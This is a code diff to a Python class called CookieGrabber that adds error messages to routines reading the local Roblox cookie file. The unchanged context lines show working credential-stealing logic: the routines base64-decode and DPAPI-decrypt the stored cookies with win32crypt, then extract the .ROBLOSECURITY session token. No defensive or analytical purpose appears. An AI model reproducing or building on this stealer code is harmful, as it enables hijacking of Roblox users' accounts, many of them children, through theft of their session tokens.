@@ -22,6 +22,7 @@ class CookieGrabber:
         )
 
         if not os.path.exists(roblox_cookies_path):
+            print("Failed to get the file, do you have Roblox installed?")
             return
 
         with open(roblox_cookies_path, 'r', encoding='utf-8') as file:
@@ -29,11 +30,13 @@ class CookieGrabber:
 
         encoded_cookies = file_content.get("CookiesData")
         if encoded_cookies is None:
+            print("Failed to get the encoded cookies from the JSON!")
             return
 
         try:
             import win32crypt
         except ImportError:
+            print("Failed to import the win32crypt module! Might be a build issue. Contact the owner.")
             return
 
         decoded_cookies = base64.b64decode(encoded_cookies)
@@ -43,5 +46,6 @@ class CookieGrabber:
 
         match = re.search(br'\.ROBLOSECURITY\t([^;]+)', decrypted_cookies)
         if match == None:
+            print("No cookie was found!")
             return
         return match[1].decode('utf-8', errors='ignore')
